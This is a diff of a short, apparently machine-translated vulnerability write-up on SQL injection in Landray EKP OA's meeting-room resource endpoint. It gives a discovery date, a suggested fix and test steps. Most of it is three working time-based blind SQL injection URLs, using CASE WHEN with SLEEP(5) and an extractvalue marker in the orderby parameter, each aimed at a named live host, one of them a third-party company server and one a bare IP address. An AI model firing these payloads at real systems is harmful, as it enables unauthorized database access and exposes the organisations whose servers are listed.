@@ -1,25 +1,46 @@
 # Landray(EKP) SQL injection
 
-I. Test process:
+Affected version: new 
 
-1. Look for the official website of Lanling OA and apply for trial 
+Time of discovery: 2020-12-21 
 
-2. Just use his demo environment 
+Found by: MIa0a 
 
-3. Log in to the background to get the cookie
+Solution: filter dangerous characters and use pre-compilation
 
-4.  Replace the cookie, and the Referer domain name 
-    The meeting place 
-    
-    
+## **A** **.** **The testing process** **:**
 
-### Vulnerability link 1 Demo
+1. Find Lanling OA official website, apply for trial
 
-http://demo.landray.com.cn:80
+2. Use the demo environment he gave
 
-![1](img\1.png)
+3. Log in to the background to get the cookie ( poc at the end of the text )
 
-### POC：
+4. Replace the cookie with the domain name of Referer
 
-![2](img\2.jpg)
+   ![](img\1.png)
+
+Conference Office
+
+## **Two** **,** **Success** **Stories** **(** **3** **Ge** **)** **:**
+
+Vulnerability link1 :
+
+http://oa.wanxinbd.com:8081/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (8233=8233) THEN SLEEP( 5) ELSE 8233 END)& ordertype = down&s_ajax = true
+
+
+
+Vulnerability link 2:
+
+http://demo.landray.com.cn:80/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (2387=2387) THEN SLEEP( 5) ELSE 2387 END)& ordertype = down&s_ajax =true
+
+
+
+Vulnerability link3 :
+
+[http://120.79.196.195:8888/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=extractvalue*&ordertype=down&s_ajax=true](https://translate.google.com/translate?hl=zh-CN&prev=_t&sl=auto&tl=en&u=http://120.79.196.195:8888/km/imeeting/km_imeeting_res/kmImeetingRes.do%3FcontentType%3Djson%26method%3DlistUse%26orderby%3Dextractvalue*%26ordertype%3Ddown%26s_ajax%3Dtrue)
+
+
+
+
 
